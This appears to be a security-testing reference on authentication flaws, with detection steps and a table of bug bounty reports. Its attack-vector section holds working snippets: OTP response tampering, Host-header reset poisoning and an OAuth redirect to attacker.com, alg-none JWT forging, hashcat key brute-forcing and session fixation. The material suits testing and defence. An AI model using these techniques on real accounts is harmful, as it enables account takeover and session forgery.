# Authentication Vulnerability Patterns

Common authentication vulnerability patterns derived from real-world bug bounty reports. Each pattern includes root cause analysis, detection strategy, and real-world case references.

---

## Root Cause Categories

### 1. Password Reset Step-Skip

**Root Cause:** Server-side validation relies on client-side responses to determine whether OTP verification succeeded. Intercepting and modifying the response bypasses the entire verification step.

**Detection Strategy:**
1. Start a password reset flow for a victim account
2. Intercept the OTP verification request/response
3. Submit the verification with an incorrect OTP
4. Modify the response from `{"success": false}` to `{"success": true}` or `{"status": "verified"}`
5. Check if the application proceeds to the password set step
6. Also try directly navigating to the password set URL without completing verification, or via parameter manipulation like `?step=4` or `?action=reset_password`

### 2. OAuth / SSO Token Theft via Open Redirect

**Root Cause:** SSO login tokens are transmitted via URL parameters on redirect. If the redirect destination can be partially controlled or pointed to a page the attacker controls (e.g., via open redirect, SVG upload with XSS), the token is leaked.

**Detection Strategy:**
1. Examine SSO/OAuth flows for referrer parameter control
2. Check if hash fragments (#) are preserved through 302 redirects
3. Look for user-controlled content (file upload, profile data) on the same SSO domain
4. Test if CSRF on the SSO login endpoint allows logging users into attacker-controlled accounts
5. Verify if SSO tokens are single-use or reusable

### 3. Credential Leak via Stream

**Root Cause:** Credentials sent in one request context (e.g., proxy-authenticated) can leak into subsequent requests after a redirect changes the connection type (e.g., proxied to direct), because hop-by-hop headers are not stripped when the request is replayed.

**Detection Strategy:**
1. Proxy requests through a controlled proxy
2. Configure the proxy to redirect to a direct-connect URL
3. Check if Proxy-Authorization headers appear in requests to the origin server

### 4. Weak Session Signing Key

**Root Cause:** The application uses a weak, guessable, or default secret key to sign session cookies (e.g., Flask session cookies, JWT tokens). An attacker can forge valid session tokens.

**Detection Strategy:**
1. Decode the session cookie (e.g., `flask-unsign --decode` for Flask, `base64 decode` for JWT)
2. Attempt to brute-force the signing key with common wordlists
3. If key is found, forge a session with arbitrary user identity
4. Test with framework-specific tools

### 5. Remember Me / Persistent Token

**Root Cause:** The "remember me" token is static, predictable, or does not properly validate against server-side storage. An attacker who steals or guesses the token gains persistent access.

**Detection Strategy:**
1. Extract the remember-me cookie after login
2. Check if it is a deterministic value (hash of username, sequential ID, timestamp)
3. Test token reuse across different sessions
4. Attempt token forgery by modifying user-identifying portions

---

## Common Attack Vectors

### Password Reset Flows

```http
-- Step-skip via status manipulation
POST /api/reset/verify
Request: {"code": "000000"}
Response: {"success": false}
-- Modify response to:
Response: {"success": true}

-- Direct password set navigation
GET /reset-password?token=any_value
POST /api/reset-password
{"token": "attacker_provided", "password": "newpass123"}

-- Host header injection (reset link manipulation)
POST /forgot-password
Host: attacker-controlled.com
{"email": "victim@example.com"}
```

### OAuth / SSO Flows

```http
-- Missing state parameter (CSRF on OAuth)
GET /oauth/authorize?client_id=app123&redirect_uri=https://app.com/callback&response_type=code
-- Add: &state=random_value to fix

-- Redirect URI manipulation
GET /oauth/authorize?client_id=app123&redirect_uri=https://attacker.com

-- Token leakage via referrer
-- OAuth callback page loads third-party resource, leaking code in Referer
```

### JWT Exploitation

```python
# None algorithm
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin"}).encode()).rstrip(b'=').decode()
forged = f"{header}.{payload}."

# Weak secret brute force
# hashcat -m 16500 jwt.txt wordlist.txt

# Algorithm confusion (RS256 -> HS256)
jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
```

### Session Fixation

```http
-- Set session cookie before login
Set-Cookie: PHPSESSID=ATTACKER_KNOWN; path=/

-- After victim logs in, use known session
curl -b "PHPSESSID=ATTACKER_KNOWN" http://target/profile
```

---

## Real-World Case References

| Report | Vulnerability | Technique | Bounty |
|--------|---------------|-----------|--------|
| Mars (3228888) | Password reset bypass via OTP response manipulation | Intercept and modify JSON response | N/A |
| Snapchat (265943) | SSO token theft via chained open redirect + SVG XSS | SSO token in URL fragment, uploaded SVG executes JS | $7,500 |
| Kubernetes (1387366) | Weak Flask SECRET_KEY brute force | `flask-unsign` with wordlist reveals key "N/A" | $250 |
| Node.js (2817648) | Crypto error handling crash | Improper error handling in async crypto ops | N/A |
| curl (3480713) | Proxy-Authorization header leak via redirect | Hop-by-hop header not stripped on connection type change | N/A |
| curl (3485826) | Alt-Svc bypasses credential leak protection (CVE-2018-1000007) | Alt-Svc remapping skips credential check | N/A |
| Sifchain (1276384) | SSH signature verification panic | Crafted ed25519 key triggers panic in golang crypto | N/A |
